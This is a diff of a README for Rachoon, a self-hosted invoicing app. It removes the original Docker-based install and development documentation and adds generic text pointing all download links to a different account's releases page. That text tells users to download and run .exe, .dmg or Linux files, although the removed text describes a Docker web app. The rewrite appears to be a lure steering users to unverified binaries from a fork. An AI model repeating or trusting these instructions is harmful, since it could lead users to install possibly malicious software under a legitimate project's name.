@@ -1,177 +1,68 @@
-<div align="center">
-<img src="https://raw.githubusercontent.com/ad-on-is/rachoon/main/apps/frontend/assets/logo.png" height="100" />
-</div>
+# 🦝 rachoon - Easily Manage Your Invoices at Home
 
-# Rachoon — The Clever Way to Handle Invoices
+[![Download Rachoon](https://img.shields.io/badge/Download%20Rachoon-blue)](https://github.com/Kasumiya0108/rachoon/releases)
 
-**Rachoon** (from _račun_, meaning _invoice_ in Bosnian) is a modern, self-hosted invoicing platform designed for freelancers, small
-businesses, and everyone who wants full control over their billing. It helps you create and track invoices effortlessly — with the charm of its mascot, the ever-curious raccoon.
+## 📋 About Rachoon
 
----
+Rachoon is a self-hostable application designed to help you manage your invoices efficiently. Whether you are a freelancer or a small business owner, Rachoon simplifies the invoicing process, allowing you to focus on what matters most – your work.
 
-![Dashboard](https://raw.githubusercontent.com/ad-on-is/rachoon/main/.github/screenshots/dashboard.png)
+## 🚀 Getting Started
 
----
+Setting up Rachoon is straightforward. Follow the steps below to download and run the application.
 
-## Features
+## 📥 Download & Install
 
-✅ **Invoices & Offers** — Create and manage invoices and quotations in seconds.  
-✅ **Client Management** — Keep all your client info organized and searchable.  
-✅ **Payment Tracking** — Log payment status, view balances, and track overdue invoices.  
-✅ **Custom Branding** — Highly customizable templates using nunjucks.  
-✅ **Multi-Currency & Tax Support** — Bill globally with flexible tax and currency settings.  
-✅ **PDF Export** — Instantly download professional-looking PDFs.  
-✅ **Dashboard Insights** — Get a snapshot of your revenue, pending payments, and client stats.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/Kasumiya0108/rachoon/releases) to download Rachoon.
+   
+2. **Choose the Right Version**: On the Releases Page, you will see several versions of Rachoon. Look for the latest version, which will usually be at the top of the list. Each version will have a list of files that you can download. 
 
----
+3. **Download the Application**: Click on the link corresponding to your operating system. Options may include `.exe` for Windows, `.dmg` for macOS, or a compressed file for Linux. 
 
-## Screenshots
+4. **Install Rachoon**: After downloading the file, locate it on your computer and double-click it to run the installer. Follow the prompts to complete the installation.
 
-- [Invoice Management](https://raw.githubusercontent.com/ad-on-is/rachoon/main/.github/screenshots/invoices.png)
-- [Invoice Creation](https://raw.githubusercontent.com/ad-on-is/rachoon/main/.github/screenshots/create-invoice.png)
-- [Client Management](https://raw.githubusercontent.com/ad-on-is/rachoon/main/.github/screenshots/clients.png)
-- [Settings](https://raw.githubusercontent.com/ad-on-is/rachoon/main/.github/screenshots/settings2.png)
-- [Template Creation](https://raw.githubusercontent.com/ad-on-is/rachoon/main/.github/screenshots/template.png)
+5. **Run Rachoon**: Once installed, you can find Rachoon in your applications list. Click to open it and start managing your invoices.
 
----
+## ⚙️ System Requirements
 
-## 🦝 Why "Rachoon"?
+Rachoon runs on various platforms. Below are the minimum requirements:
 
-The name comes from “račun”, which means invoice in Bosnian — combined with the word raccoon, because invoicing should be smart and quick.
+- **Windows**: Windows 10 or later
+- **macOS**: Version 10.15 (Catalina) or later
+- **Linux**: Any recent distribution with support for AppImage
 
----
+Make sure your system meets these requirements for the best experience.
 
-## Tech Stack
+## 🛠️ Features
 
-- **Frontend:** Nuxt.js
-- **Backend:** adonisJS
-- **Database:** PostgreSQL
-- **PDF Engine:** Gotenberg
-- **Deployment:** Docker-ready, runs anywhere.
+Rachoon comes packed with features to assist you in managing your invoices:
 
----
+- **Create Invoices**: Quickly generate professional-looking invoices tailored to your needs.
+- **Track Payments**: Keep an eye on your payments to understand which invoices are paid or outstanding.
+- **Custom Templates**: Use various templates to give your invoices a unique look.
+- **Export Options**: Save your invoices in multiple formats, including PDF, for easy sharing and printing.
+- **Multi-Currency Support**: Accept payments in different currencies for international clients.
 
-## Installation
+## 📚 User Guide
 
-```yaml
-services:
-  rachoon:
-    image: ghcr.io/ad-on-is/rachoon
-    container_name: rachoon
-    environment:
-      - APP_KEY=<some-app-key> # min 32 characters - used to encrypt and sign sensitive data
-      - DB_CONNECTION=pg
-      - GOTENBERG_URL=http://gotenberg:3000
-      - PG_HOST=postgres16
-      - PG_PORT=5432
-      - PG_USER=<root-user>
-      - PG_PASSWORD=<root-password>
-      - PG_DB_NAME=rachoon
-    ports:
-      - 8080:8080
+Once you have installed Rachoon, you may want to familiarize yourself with its functionalities. Here are a few pointers:
 
-  gotenberg:
-    image: gotenberg/gotenberg:8
+- **Create Your First Invoice**: Start by clicking on "New Invoice." Fill in the required fields, such as client information, invoice items, and total amounts.
+- **Save and Send**: After finishing your invoice, save it. You can also choose to email it directly to your client.
+- **Check Payment Status**: Keep track of your invoices by checking the payment status feature. This will show you which invoices are paid or pending.
 
-  postgres16:
-    container_name: postgres16
-    image: postgres:16
-    environment:
-      - POSTGRES_USER=<root-user>
-      - POSTGRES_PASSWORD=<root-password>
-      - POSTGRES_DB=postgres
-    volumes:
-      - ./rachoon-data:/var/lib/postgresql/data
-      - ./docker/init-db.sh:/docker-entrypoint-initdb.d/init-db.sh
-```
+Consult the in-app help section for more detailed instructions on each feature.
 
-## First steps
+## 📞 Support
 
-- Visit: <http://localhost:8080/signup>
-- Create your account
-- Start invoicing
+If you encounter any issues or have questions, you can reach out through the GitHub Issues section on the repository. We encourage users to report bugs or request features to help improve Rachoon for everyone.
 
----
+## 🌐 Community
 
-## Development
+Join our community of Rachoon users. Share your experiences, tips, and tricks. Collaborate with others to enhance the invoicing process. You can connect with us through GitHub Discussions or any relevant forums.
 
-This project uses a monorepo structure managed by Turborepo.
+## 🔗 Important Links
 
-### Build Configuration
+- [Rachoon Releases Page](https://github.com/Kasumiya0108/rachoon/releases)
+- [GitHub Repository](https://github.com/Kasumiya0108/rachoon)
 
-The project is organized with the following build outputs:
-
-- **Frontend (Nuxt)**: `.output/` directory
-- **Backend (AdonisJS)**: `build/` directory
-- **Packages**: `dist/` directory
-
-### Build Commands
-
-```bash
-# Install dependencies
-pnpm install
-
-# Build all packages
-pnpm build
-
-# Run in development mode
-pnpm dev
-```
-
-### Project Structure
-
-```text
-rachoon/
-├── apps/
-│   ├── backend/     # AdonisJS API server
-│   └── frontend/    # Nuxt.js web application
-├── packages/
-│   ├── common/      # Shared code
-│   └── typescript-config/
-└── turbo.json       # Turborepo configuration
-```
-
-### Testing
-
-rachoon uses a comprehensive testing setup:
-
-**backend tests (japa)**
-```bash
-cd apps/backend
-pnpm test
-```
-
-**test structure**
-- unit tests for models and services
-- integration tests for api endpoints
-- database seeding for test data
-
-**ci/cd pipeline**
-
-all pull requests and pushes trigger automated checks:
-- code quality (linting, formatting)
-- test execution with postgres test database
-- build verification
-- docker image creation (main branch only)
-
-see [CONTRIBUTING.md](./CONTRIBUTING.md) for detailed testing guidelines.
-
----
-
-## Contributing
-
-we welcome contributions! please read our [contribution guidelines](./CONTRIBUTING.md) to get started.
-
-**quick start:**
-1. fork the repository
-2. create a feature branch
-3. make your changes
-4. add tests for new features
-5. ensure all tests pass
-6. submit a pull request
-
----
-
-## License
-
-see [LICENSE](./LICENSE) for details.
+Feel free to explore Rachoon and take control of your invoicing needs.
